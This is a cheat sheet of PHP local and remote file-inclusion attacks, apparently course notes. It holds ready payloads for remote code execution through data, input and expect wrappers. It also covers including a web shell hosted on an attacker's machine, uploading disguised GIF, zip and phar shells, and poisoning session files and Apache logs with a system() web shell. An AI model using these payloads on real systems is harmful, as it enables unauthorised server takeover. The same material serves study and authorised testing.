___

# PHP Wrappers

| `/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id`                    | RCE with data wrapper   |
| --------------------------------------------------------------------------------------------------------------------------- | ----------------------- |
| `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"` | RCE with input wrapper  |
| `curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"`                                                        | RCE with expect wrapper |

# RFI

| `echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server <LISTENING_PORT>` | Host web shell               |
| ---------------------------------------------------------------------------------------------- | ---------------------------- |
| `/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id`                        | Include remote PHP web shell |

# LFI and File Uploads

| `echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif`                        | Create malicious image                |
| ------------------------------------------------------------------------------ | ------------------------------------- |
| `/index.php?language=./profile_images/shell.gif&cmd=id`                        | RCE with malicious uploaded image     |
| `echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php` | Create malicious zip archive 'as jpg' |
| `/index.php?language=zip://shell.zip%23shell.php&cmd=id`                       | RCE with malicious uploaded zip       |
| `php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg`            | Create malicious phar 'as jpg'        |
| `/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id`     | RCE with malicious uploaded phar      |
# Log Poisoning


| `/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`         | Read PHP session parameters       |
| ----------------------------------------------------------------------------------- | --------------------------------- |
| `/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E`       | Poison PHP session with web shell |
| `/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id`  | RCE through poisoned PHP session  |
| `curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>'` | Poison server log                 |
| `/index.php?language=/var/log/apache2/access.log&cmd=id`                            | RCE through poisoned PHP session  |

